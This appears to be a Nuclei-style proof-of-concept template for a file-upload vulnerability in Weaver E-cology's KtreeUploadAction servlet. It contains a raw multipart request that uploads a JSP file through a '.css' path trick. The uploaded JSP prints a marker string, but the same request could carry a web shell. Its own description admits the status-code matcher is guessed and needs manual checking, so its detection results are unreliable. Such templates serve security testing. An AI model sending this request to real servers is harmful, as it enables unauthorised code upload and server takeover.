id: poc-gw2x0dxvp6xzwtao
info:
  name: 泛微 E-cology KtreeUploadAction 存在文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image HTTP/1.1


    Content-Type: multipart/form-data; boundary=ce2c603de19573a853c8facc8cf14425


    --ce2c603de19573a853c8facc8cf14425


    Content-Disposition: form-data; name="files"; filename="123456.jsp"


    Content-Type: image/jpeg


    <%out.println("hello2022 ! world2022");%>


    --ce2c603de19573a853c8facc8cf14425--


    # 响应代码特征

    -1


    # 响应内容特征

    hello2022


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
